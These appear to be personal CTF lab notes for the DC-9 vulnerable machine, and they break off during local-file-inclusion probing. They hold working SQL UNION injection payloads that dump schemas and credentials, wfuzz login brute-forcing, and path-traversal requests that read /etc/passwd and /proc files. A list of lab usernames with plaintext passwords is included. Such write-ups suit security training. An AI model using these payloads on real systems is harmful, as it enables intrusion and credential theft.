SQL Injection reference: https://pentestmonkey.net/category/cheat-sheet/sql-injection 

1. nmap scan of the box: 
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome

only seeing 80 is open

2. checking out the example site. 
- Standard example site, and search seems to be the most interesting page. 
  search takes first name or last name and returns a result 

3. run a gobuster against the site. 
gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster-main.out

dir == setting gobuster to use directory mode 
-x == add extension (php in this example because the site is showing it)
-o == output results to a file 

Results in gobuster-main.out

4. Testing SQL Injection requests to search in burp with intercept on. 
- No SQL error with simple test of <FIRSTNAME> and a ' at the end 
- Data is returned when a comment is added " <FIRSTNAME>'-- - "
- SQL injection is possible 
- reference of what gets returned names: 
        ID: 1
        Name: Mary Moe
        Position: CEO
        Phone No: 46478415155456
        Email: marym@example.com
- SQL UNION Injection PoC: 
-- In order for a UNION to work I need to know what should be included in the select. 
Using the above return as a reference testing UNION in burp: 

POST /results.php HTTP/1.1
Host: 10.0.2.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://10.0.2.4
Connection: close
Referer: http://10.0.2.4/search.php
Upgrade-Insecure-Requests: 1

search=Mary' UNION SELECT 1,2,3,4,5,6-- -

The above request returns the following it its response once 6 args are passed: 
                ID: 1<br/>Name: 2 3<br/>
                Position: 4<br />
                Phone No: 5<br />
                Email: 6<br/><br/>Another test can be done by passing database()First and Last

NOTE: you can also use ORDER BY to tests results in a response. Pass the following Query until the response is different (byte size)
Example: 

POST /results.php HTTP/1.1
Host: 10.0.2.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://10.0.2.4
Connection: close
Referer: http://10.0.2.4/search.php
Upgrade-Insecure-Requests: 1

search=Mary' ORDER BY 7 -- -

On the 7th request the bytes are differnt than the previous 6 requests. This tells me that SQL was not able to find a match. 

Gathering more information about the schema with: 
search=Mary' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM information_schema.schemata-- -

Returns: 
ID: 1                  
ID: information_schema << 
ID: Staff
ID: users

All of the above information can be returned on a single line with: 
search=Mary' UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata-- -

Result: 
ID: information_schema,Staff,users

5. Gathering information about Staff and Users
- This request gives me all the table names 
search=Mary' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables-- -

Refining this to the Staff instance with 
search=Mary' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables where table_schema = "Staff"-- -

- Staff has the following tables: 
  StaffDetailss
  Users
 
Using this to get columns
search=Mary' UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = "Staff"-- -

- Staff has the following columns: 
  id,
  firstname,
  lastname,
  position,
  phone, 
  email,
  reg_date,
  UserID,
  Username,
  Password

Using this to get the relationships within Staff 
search=Mary' UNION SELECT group_concat(TABLE_NAME,":",COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = "Staff"-- -

saved in db_details

6. Extract Users Passwords from instances
search=Mary' UNION SELECT group_concat(Username,":",PAssword),2,3,4,5,6 FROM Staff.Users-- -

and

search=Mary' UNION SELECT group_concat(username,":",password),2,3,4,5,6 FROM users.UserDetails-- -

All usernames and passwords are strored in users

7. The admin password is an md5 hash
856f5de590ef37314e7c3bdf6f8a66dc:transorbital1

8. Testing logins. 
NOTE there is no CSRF token present on login. 

POST /manage.php HTTP/1.1
Host: 10.0.2.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.0.2.4
Connection: close
Referer: http://10.0.2.4/manage.php
Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
Upgrade-Insecure-Requests: 1

username=testusername&password=testpassword

Seperate out usernames and passwords with awk: 
┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
└─$ awk -F: '{print $1}' users > usernames
                                                                                                                                                           
┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
└─$ awk -F: '{print $2}' users > passwords

Using WFUZZ to test login

┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
└─$ wfuzz -c -z file,usernames -z file,passwords -m zip -d 'username=FUZZ&password=FUZ2Z' http://10.0.2.4/manage.php

-c == output with color 
-z == Payload
-m == iterate for combining payloads
-d == POST data

Target: http://10.0.2.4/manage.php
Total requests: 18

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================

000000016:   200        50 L     93 W       1248 Ch     "scoots - YR3BVxxxw87"                                                                    
302 [redirect response tells me this worked]>>>>>> 000000001:   302        50 L     87 W       1210 Ch     "admin - transorbital1"                                                                   
000000002:   200        50 L     93 W       1248 Ch     "marym - 3kfs86sfd"                                                                       
000000005:   200        50 L     93 W       1248 Ch     "barneyr - RocksOff"                                                                      
000000008:   200        50 L     93 W       1248 Ch     "wilmaf - Pebbles"                                                                        
000000014:   200        50 L     93 W       1248 Ch     "monicag - 3248dsds7s"                                                                    
000000015:   200        50 L     93 W       1248 Ch     "phoebeb - smellycats"                                                                    
000000003:   200        50 L     93 W       1248 Ch     "julied - 468sfdfsd2"                                                                     
000000007:   200        50 L     93 W       1248 Ch     "jerrym - B8m#48sd"                                                                       
000000009:   200        50 L     93 W       1248 Ch     "bettyr - BamBam01"                                                                       
000000006:   200        50 L     93 W       1248 Ch     "tomc - TC&TheBoyz"                                                                       
000000004:   200        50 L     93 W       1248 Ch     "fredf - 4sfd87sfd1"                                                                      
000000017:   200        50 L     93 W       1248 Ch     "janitor - Ilovepeepee"                                                                   
000000018:   200        50 L     93 W       1248 Ch     "janitor2 - Hawaii-Five-0"                                                                
000000013:   200        50 L     93 W       1248 Ch     "rossg - ILoveRachel"                                                                     
000000011:   200        50 L     93 W       1248 Ch     "joeyt - Passw0rd"                                                                        
000000012:   200        50 L     93 W       1248 Ch     "rachelg - yN72#dsd"                                                                      
000000010:   200        50 L     93 W       1248 Ch     "chandlerb - UrAG0D!"                                                                     

9. Logging in as admin and taking a look around

On login there is a message stating "file does not exist" 
- http://10.0.2.4/addrecord.php this page allows me to add a new record into the DB. 

- Going to fuzz http://10.0.2.4/manage.php to see if I can sort out what file it is looking for. 
- NOTE: wfuzz in this instance needs the PHPSESSION to be passed into it
-- reference: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0

- LFI test: 
┌──(kali㉿kali)-[/usr/share]
└─$ wfuzz -b 'PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0' --hw 100 -c -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.0.2.4/manage.php?FUZZ=../../../../../../../../../../../../../etc/passwd

-b == cookie 
--hw == hide word count (in this case 100 == failed result after prvious testing)
- c == colors
- w == wordlist (using something from SecLists)
- ../../../../../../../../../../../../../etc/passwd (init test for LFI to see if passwd comes back)

- Testing result in the burp: 

GET /manage.php?file=../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 10.0.2.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.0.2.4/search.php
Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
Upgrade-Insecure-Requests: 1

Response in passwd

10. explore LFI 
- look for log file
Request: 
GET /manage.php?file=../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1
Host: 10.0.2.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.0.2.4/search.php
Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
Upgrade-Insecure-Requests: 1

Response: File does not exist

- test for code execution
- searching through the /proc/self directory to gain info on what PID this user is: 
Request: 
GET /manage.php?file=../../../../../../../../../../../../../proc/self/cmdline HTTP/1.1
Host: 10.0.2.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.0.2.4/search.php
Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
Upgrade-Insecure-Requests: 1

Response: 
<br />/usr/sbin/apache2-kstart	
Going to fuzz the /proc/self/fd directory (this is where processes are listed for the above user)

┌──(kali㉿kali)-[/proc/self/fd]
└─$ wfuzz -z range,0-100 -b 'PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0' --hw 100 -u http://10.0.2.4/manage.php?file=../../../../../../../../../../../../../proc/self/fd/FUZZ

- The above returns nothing. 

- Look at /proc/sched_debug
Request: 

GET /manage.php?file=../../../../../../../../../../../../../proc/sched_debug HTTP/1.1
Host: 10.0.2.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.0.2.4/search.php
Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
Upgrade-Insecure-Requests: 1

Response: sched_debug